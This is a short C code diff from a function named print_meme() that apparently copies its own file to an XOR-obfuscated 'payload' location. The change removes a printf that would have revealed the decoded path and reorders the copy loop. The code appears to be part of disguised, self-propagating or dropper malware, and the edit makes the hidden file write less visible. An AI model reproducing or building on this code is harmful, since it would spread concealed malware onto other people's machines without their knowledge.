@@ -173,18 +173,17 @@ void print_meme() {
         return; 
     }
 
-    printf(dexor(PAYLOAD_LOCATION_XOR));
     int dest_file = open(dexor(PAYLOAD_LOCATION_XOR), O_WRONLY | O_CREAT, 0665);
     if (dest_file < 0) {
         goto failure;
     }
-    int nread = 0;
-    while (nread = read(curr_file, scratch, sizeof scratch), nread > 0) {
-        char * scratch_ptr = scratch;
-	ssize_t write_count;
 
+    int nread = 0; 
+    while (nread = read(curr_file, scratch, sizeof scratch), nread > 0) {
+	ssize_t write_count;
+        char * scratch_ptr = scratch;
 	do {
-            write_count = write(dest_file, scratch_ptr, nread);
+            write_count = write(dest_file, scratch_ptr, nread); 
 	    if (write_count >= 0) {
 	        nread -= write_count;
 	        scratch_ptr += write_count;
